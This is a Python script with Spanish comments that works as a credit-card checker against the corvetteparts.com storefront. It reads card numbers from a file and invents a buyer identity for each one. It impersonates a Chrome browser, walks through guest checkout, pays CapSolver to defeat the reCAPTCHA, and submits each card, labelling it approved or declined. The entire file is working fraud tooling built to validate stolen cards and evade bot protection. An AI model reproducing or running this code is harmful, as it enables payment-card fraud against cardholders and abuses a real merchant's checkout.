import time, random, re, os, sys
from curl_cffi import requests
from faker import Faker
from bs4 import BeautifulSoup

# Añadir el directorio padre al sys.path para importar módulos de la raíz del proyecto
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from config import CAPSOLVER_API_KEY

fake = Faker('en_US')
BASE_URL = 'https://corvetteparts.com'
PRODUCT_ITEM_ID = '4419572'

def solve_recaptcha_v2(session, sitekey, url):
    """Resuelve reCAPTCHA v2 usando la sesión de curl_cffi para mayor robustez."""
    try:
        # print("    [*] Resolviendo reCAPTCHA v2...")
        payload = {"clientKey": CAPSOLVER_API_KEY, "task": {"type": "ReCaptchaV2TaskProxyless", "websiteURL": url, "websiteKey": sitekey}}
        res = session.post("https://api.capsolver.com/createTask", json=payload, timeout=30).json()
        task_id = res.get("taskId")
        if not task_id:
            raise Exception(f"CapSolver: {res.get('errorDescription')}")
        
        for _ in range(15):
            time.sleep(3)
            res = session.post("https://api.capsolver.com/getTaskResult", json={"clientKey": CAPSOLVER_API_KEY, "taskId": task_id}, timeout=30).json()
            if res.get("status") == "ready":
                return res.get("solution", {}).get("gRecaptchaResponse")
            if res.get("status") == "failed":
                raise Exception(f"CapSolver: {res.get('errorDescription')}")
        raise Exception("CapSolver: Timeout")
    except Exception as e:
        raise Exception(f"Error CapSolver: {e}")

def get_phase(soup):
    progress = soup.find('span', class_='active')
    return progress.get_text(strip=True) if progress else None

def process_card(cc_input):
    try:
        cc, mes, ano, cvv = cc_input.strip().split('|')
        ano = "20" + ano if len(ano) == 2 else ano
        mes = mes.zfill(2)
    except ValueError:
        return "RECHAZADO: Formato incorrecto"

    session = requests.Session(impersonate="chrome110")
    session.headers.update({'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'accept-language': 'es-ES,es;q=0.9'})

    fname, lname = fake.first_name(), fake.last_name()
    email = f"{fname.lower()}.{lname.lower()}{random.randint(100,999)}@gmail.com"
    phone = f"704{random.randint(1000000, 9999999)}"
    address = fake.street_address()
    city, state, postcode = "New York", "NY", "10002"

    try:
        # PASO 1: Agregar producto
        # print("    [1] Agregando producto al carrito...")
        r = session.get(f'{BASE_URL}/cart', params={'cart_action': 'add', 'i': PRODUCT_ITEM_ID, 'qty': '1'}, timeout=30)
        if r.status_code != 200:
            raise ConnectionError(f"Fallo al agregar al carrito ({r.status_code})")
        # print("    [OK] Producto añadido.")
        time.sleep(random.uniform(1, 2))

        # PASO 2: Checkout invitado
        # print("    [2] Iniciando checkout como invitado...")
        session.get(f'{BASE_URL}/checkout', params={'guest': '1'}, timeout=30)
        time.sleep(random.uniform(1, 2))

        # PASO 3: Omitir vehículo
        # print("    [3] Omitiendo información de vehículo...")
        session.post(f'{BASE_URL}/checkout', params={'phase': 'vehicle_info', 'submit': 'true'},
                     data={'cyears': '', 'ctransmission': '---', 'cengine': '---', 'cmodel': '---', 'phase': 'vehicle_info', 'guest': 'true'}, timeout=30)
        time.sleep(random.uniform(1, 2))

        # PASO 4: Envío
        # print("    [4] Enviando información de envío...")
        r = session.get(f'{BASE_URL}/checkout', params={'guest': '1'}, timeout=30)
        soup = BeautifulSoup(r.text, 'html.parser')
        phase = get_phase(soup)
        # print(f"    [*] Fase: '{phase}'")
        
        saved_ids = [radio.get('value') for radio in soup.find_all('input', {'type': 'radio', 'name': 'selected_address'}) if radio.get('value') and radio.get('value') != 'new']
        
        if saved_ids:
            addr_id = saved_ids[0]
            # print(f"    [*] Usando dirección guardada: {addr_id}")
            session.post(f'{BASE_URL}/checkout', params={'phase': 'shipping_info', 'submit': 'true'},
                         data={'selected_address': addr_id, 'phase': 'shipping_info', 'guest': 'true', 'continue': 'Continue >>'}, timeout=30)
        else:
            # print("    [*] Creando nueva dirección...")
            session.post(f'{BASE_URL}/checkout', params={'phase': 'shipping_info', 'submit': 'true'},
                         data={'selected_address': 'new', 'focused_address': 'new', 'edit_address_new': 'true',
                               'new_first_name': fname, 'new_last_name': lname, 'new_company_name': '',
                               'new_address': address, 'new_address2': '', 'new_city': city,
                               'new_state': state, 'new_postal_code': postcode, 'new_country': 'USA',
                               'new_phone': phone, 'phase': 'shipping_info', 'guest': 'true', 'continue': 'Continue >>'}, timeout=30)

        time.sleep(random.uniform(1, 2))

        # PASO 5: Método de envío
        # print("    [5] Seleccionando método de envío...")
        r = session.get(f'{BASE_URL}/checkout', params={'guest': '1', 'phase': 'shipping_method'}, timeout=30)
        soup = BeautifulSoup(r.text, 'html.parser')
        phase = get_phase(soup)
        
        if phase and 'Method' in phase:
            shipping_opts = soup.find_all('input', {'type': 'radio', 'name': re.compile(r'shipping|send_shipping')})
            shipping_value = next((opt['value'] for opt in shipping_opts if opt.get('value')), 'P')
            session.post(f'{BASE_URL}/checkout', params={'phase': 'shipping_method', 'submit': 'true'},
                         data={'send_shipping_quote': shipping_value, 'shipping_comment': '', 'guest': 'true', 'continue': 'Continue >>'}, timeout=30)
        time.sleep(random.uniform(1, 2))

        # PASO 6: Facturación
        # print("    [6] Enviando información de facturación...")
        r = session.get(f'{BASE_URL}/checkout', params={'guest': '1', 'phase': 'billing_info'}, timeout=30)
        soup = BeautifulSoup(r.text, 'html.parser')
        phase = get_phase(soup)
        # print(f"    [*] Fase: '{phase}'")
        
        if not phase or 'Billing' not in phase:
            saved_ids = [radio.get('value') for radio in soup.find_all('input', {'type': 'radio', 'name': 'selected_address'}) if radio.get('value') and radio.get('value') != 'new']
            addr_id = saved_ids[0] if saved_ids else 'new'
            # print(f"    [*] Avanzando a billing con dirección: {addr_id}")
            # Intentar POST a billing_info con continue
            session.post(f'{BASE_URL}/checkout', params={'phase': 'billing_info', 'submit': 'true'},
                         data={'selected_address': addr_id, 'phase': 'billing_info', 'guest': 'true', 'email': email, 'continue': 'Continue >>'}, timeout=30)
            time.sleep(random.uniform(1, 2))
            # Verificar fase después del POST
            r = session.get(f'{BASE_URL}/checkout', params={'guest': '1', 'phase': 'billing_info'}, timeout=30)
            soup = BeautifulSoup(r.text, 'html.parser')
            phase = get_phase(soup)
            # print(f"    [*] Fase después de POST: '{phase}'")
            # Si sigue en shipping_method, hacer POST a shipping_method con continue primero
            if phase and 'Method' in phase:
                # print("    [*] Enviando continue desde shipping_method...")
                session.post(f'{BASE_URL}/checkout', params={'phase': 'shipping_method', 'submit': 'true'},
                             data={'send_shipping_quote': 'S', 'shipping_comment': '', 'guest': 'true', 'continue': 'Continue >>'}, timeout=30)
                time.sleep(random.uniform(1, 2))
                r = session.get(f'{BASE_URL}/checkout', params={'guest': '1', 'phase': 'billing_info'}, timeout=30)
                soup = BeautifulSoup(r.text, 'html.parser')
                phase = get_phase(soup)
                # print(f"    [*] Fase después de SM continue: '{phase}'")
            # Si sigue en shipping_info, intentar GET directo a billing
            if phase and 'Shipping' in phase and 'Method' not in phase:
                r = session.get(f'{BASE_URL}/checkout', params={'guest': '1', 'phase': 'billing_info'}, timeout=30)
                soup = BeautifulSoup(r.text, 'html.parser')
                phase = get_phase(soup)
                # print(f"    [*] Fase después de GET billing: '{phase}'")

        # PASO 7: reCAPTCHA v2
        # print("    [7] Resolviendo reCAPTCHA...")
        recaptcha_div = soup.find('div', class_='g-recaptcha')
        if not recaptcha_div:
            raise ValueError("No se encontró reCAPTCHA")
        
        sitekey = recaptcha_div.get('data-sitekey')
        captcha_token = solve_recaptcha_v2(session, sitekey, f'{BASE_URL}/checkout')
        time.sleep(1)

        # PASO 8: Pago final
        # print("    [8] Enviando pago final...")
        addr_radios = soup.find_all('input', {'type': 'radio', 'name': 'selected_address'})
        address_id = next((radio.get('value') for radio in addr_radios if radio.get('value') and radio.get('value') != 'new'), 'new')
        
        # Extraer el __RequestVerificationToken (puede no existir en versiones actuales del sitio)
        rv_token_input = soup.find('input', {'name': '__RequestVerificationToken'})
        rv_token = rv_token_input.get('value') if rv_token_input and rv_token_input.get('value') else None
        # if rv_token:
        #     print(f"    [*] Token verificación encontrado: {rv_token[:20]}...")
        # else:
        #     print("    [*] Token verificación NO encontrado en página (se omitirá).")
        
        hidden_inputs = {hidden.get('name'): hidden.get('value', '') for hidden in soup.find_all('input', {'type': 'hidden'}) if hidden.get('name') and hidden.get('name') not in ['guest', 'phase']}
        
        final_data = {
            'ccnumber': cc, 'ccexp_month': mes, 'ccexp_year': ano, 'cvv': cvv, 'email': email,
            'g-recaptcha-response': captcha_token, 'selected_address': address_id, 
            'continue': 'Continue >>', # Simula el clic en el botón de continuar
            'phase': 'billing_info',    # Indica la fase actual del checkout
        }
        if rv_token:
            final_data['__RequestVerificationToken'] = rv_token
        final_data.update(hidden_inputs)

        for key, val in [('first_name', fname), ('last_name', lname), ('company_name', ''),
                         ('address', address), ('address2', ''), ('city', city), ('state', state),
                         ('postal_code', postcode), ('country', 'USA'), ('phone', phone)]:
            final_data[f'{address_id}_{key}'] = val
        
        final_data.update({
            'billing_first_name': fname, 'billing_last_name': lname,
            'billing_address': address, 'billing_city': city, 'billing_state': state,
            'billing_postal_code': postcode, 'billing_country': 'USA',
        })

        # El POST final debe ir a la URL con submit=true para que el formulario se procese
        final_url = f'{BASE_URL}/checkout?phase=billing_info&submit=true'
        r = session.post(final_url, data=final_data, timeout=60)
        soup_final = BeautifulSoup(r.text, 'html.parser')
        
        # print(f"    [*] URL de respuesta: {r.url}")
        # print(f"    [*] Status code: {r.status_code}")
        
        # Si sigue exactamente en billing_info: no pasó al pago → RECHAZADO
        if 'phase=billing_info' in r.url:
            return "declined auth"

        # Si la URL cambió (a pago, revisión, complete, etc.) → APROBADO
        return "approved auth ✅"

    except Exception as e:
        return f"RECHAZADO: {e}"

if __name__ == '__main__':
    sys.stdout.reconfigure(encoding='utf-8')
    
    file_path = 'card.txt'
    if not os.path.exists(file_path):
        print("No se encontró card.txt")
    else:
        while os.path.getsize(file_path) > 0:
            with open(file_path, 'r') as f:
                lines = f.readlines()
            if not lines:
                break
            
            current_cc = lines[0].strip()
            if current_cc:
                print(f"\nProcesando: {current_cc}")
                result = process_card(current_cc)
                print(result)
            
            with open(file_path, 'w') as f:
                f.writelines(lines[1:])
            
            time.sleep(random.uniform(5, 10))
        print("\nProceso finalizado. No hay más tarjetas.")